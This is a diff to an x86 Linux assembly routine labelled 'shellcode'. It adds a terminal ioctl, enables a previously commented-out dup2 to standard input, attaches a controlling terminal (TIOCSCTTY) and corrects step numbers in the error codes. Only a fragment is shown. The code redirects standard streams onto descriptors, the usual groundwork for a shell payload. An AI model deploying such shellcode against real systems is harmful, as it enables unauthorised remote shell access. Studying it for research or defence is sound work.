@@ -2,6 +2,7 @@
 #
 # Copyright(c) Thomas Habets 2009
 #
+# http:  //foosec.pl/pub/info/syscalls_linux_2_2.html
 # dup2=63, read=3, write=4, close=6
 #
         .text
@@ -54,21 +55,31 @@ shellcode:
         cmpl    $1, %eax
         jne      errout
 
+        # ioctl(fd, TIOCNOTTY, .)
+        movl    $54, %eax
+        movl    $0, %ebx         # fd
+        movl    $0x5422, %ecx    # TIOCNOTTY
+        movl    $0, %edx
+        int     $0x80
+        movl    $45, %ebx       # step 45
+        cmpl    $0, %eax
+        jl      erroutclose
+
         # dup2(n, 0)
-        #movl    $63, %eax
-        #movl    208(%ebp), %ebx
-        #movl    $0, %ecx
-        #int     $0x80
-        #movl    $30, %ebx       # step 50 - dup2(n, 0)
-        #cmpl    $0, %eax
-        #jl      erroutclose
+        movl    $63, %eax
+        movl    208(%ebp), %ebx
+        movl    $0, %ecx
+        int     $0x80
+        movl    $50, %ebx       # step 50 - dup2(n, 0)
+        cmpl    $0, %eax
+        jl      erroutclose
 
         # dup2(n, 1)
         movl    $63, %eax
         movl    212(%ebp), %ebx
         movl    $1, %ecx
         int     $0x80
-        movl    $30, %ebx       # step 60 - dup2(n, 1)
+        movl    $60, %ebx       # step 60 - dup2(n, 1)
         cmpl    $0, %eax
         jl      erroutclose
 
@@ -77,15 +88,32 @@ shellcode:
         movl    216(%ebp), %ebx
         movl    $2, %ecx
         int     $0x80
-        movl    $30, %ebx       # step 70 - dup2(n, 2)
+        movl    $70, %ebx       # step 70 - dup2(n, 2)
         cmpl    $0, %eax
         jl      erroutclose
+
+        # setsid()
+        #movl    $66, %eax
+        #int     $0x80
+        #movl    $73, %ebx       # step 73
+        #cmpl    $0, %eax
+        #jl      erroutclose
+
+        # ioctl(fd, TIOCTTY, 1)
+        movl    $54, %eax
+        movl    $0, %ebx         # fd
+        movl    $0x540E, %ecx    # TIOCSCTTY
+        movl    $1, %edx
+        int     $0x80
+        movl    $75, %ebx       # step 75
+        cmpl    $0, %eax
+        jne      erroutclose
 
         # close(socket)
         movl    $6, %eax
         movl    24(%ebp), %ebx
         int     $0x80
-        movl    $30, %ebx       # step 80
+        movl    $80, %ebx       # step 80
         cmpl    $0, %eax
         jl      erroutclose
 
@@ -93,7 +121,7 @@ shellcode:
         movl    $6, %eax
         movl    208(%ebp), %ebx
         int     $0x80
-        movl    $30, %ebx       # step 90
+        movl    $90, %ebx       # step 90
         cmpl    $0, %eax
         jl      erroutclose
 
@@ -101,7 +129,7 @@ shellcode:
         movl    $6, %eax
         movl    212(%ebp), %ebx
         int     $0x80
-        movl    $30, %ebx       # step 100
+        movl    $100, %ebx       # step 100
         cmpl    $0, %eax
         jl      erroutclose
 
@@ -109,7 +137,7 @@ shellcode:
         movl    $6, %eax
         movl    216(%ebp), %ebx
         int     $0x80
-        movl    $30, %ebx       # step 110
+        movl    $110, %ebx       # step 110
         cmpl    $0, %eax
         jl      erroutclose
         
